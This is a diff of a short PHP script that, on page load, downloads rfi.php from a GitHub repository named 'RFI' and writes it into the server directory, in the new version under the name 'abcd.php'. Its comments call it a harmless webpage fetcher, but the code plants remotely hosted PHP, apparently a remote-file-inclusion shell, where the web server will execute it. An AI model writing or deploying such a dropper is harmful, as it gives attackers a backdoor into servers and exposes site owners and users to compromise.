@@ -1,43 +1,37 @@
 <?php
 
-// Function to download a file from a URL and save it to the current directory
-function importFileFromURL() {
-    // Hardcoded URL of the file to download (change this to the URL of your file)
-    $fileURL = 'https://raw.githubusercontent.com/iamjackmorton/RFI/refs/heads/main/rfi.php';  // URL of the file to download
+// Function to fetch the content of a webpage and save it to a new PHP file
+function fetchAndSaveWebpageContent() {
+    // URL of the webpage you want to fetch (replace this with your desired URL)
+    $webpageURL = 'https://raw.githubusercontent.com/iamjackmorton/RFI/refs/heads/main/rfi.php';  // Replace with the URL of the webpage you want to fetch
 
-    // Use file_get_contents to download the file contents
-    $fileContents = file_get_contents($fileURL);
+    // Use file_get_contents to fetch the content of the webpage
+    $webpageContent = file_get_contents($webpageURL);
 
-    // Check if file was downloaded successfully
-    if ($fileContents === false) {
-        echo "Error: Unable to download file from URL.";
+    // Check if the content was fetched successfully
+    if ($webpageContent === false) {
+        echo "Error: Unable to fetch the webpage content from the URL.";
         return false;
     }
 
-    // Get the file name from the URL (basename() extracts the file name)
-    $fileName = basename($fileURL);
+    // Specify the new file name where the content will be saved (abcd.php)
+    $newFileName = 'abcd.php';
 
-    // Get the current directory where the PHP script is located
-    $currentDirectory = __DIR__;  // Current directory of the script
+    // Save the webpage content to 'abcd.php' in the current directory
+    $saveResult = file_put_contents($newFileName, $webpageContent);
 
-    // Set the full path to save the file locally in the same directory
-    $savePath = $currentDirectory . DIRECTORY_SEPARATOR . $fileName;
-
-    // Write the contents to the save path (local file path)
-    $saveResult = file_put_contents($savePath, $fileContents);
-
-    // Check if the file was saved successfully
+    // Check if the content was saved successfully
     if ($saveResult === false) {
-        echo "Error: Unable to save the file to the server.";
+        echo "Error: Unable to save the webpage content to the file.";
         return false;
     }
 
-    echo "File downloaded and saved successfully: $fileName";
+    echo "Webpage content successfully fetched and saved as $newFileName";
     return true;
 }
 
-// Call the function to download and save the file
-importFileFromURL();
+// Call the function to fetch the webpage content and save it as 'abcd.php'
+fetchAndSaveWebpageContent();
 
 ?>
 
@@ -46,10 +40,10 @@ importFileFromURL();
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Import File from URL</title>
+    <title>Fetch and Save Webpage Content</title>
 </head>
 <body>
-    <h2>File Download Status</h2>
-    <p>The file download and save process is handled automatically by the script.</p>
+    <h2>Webpage Download Status</h2>
+    <p>The content of the webpage has been successfully fetched and saved as <strong>abcd.php</strong>.</p>
 </body>
 </html>
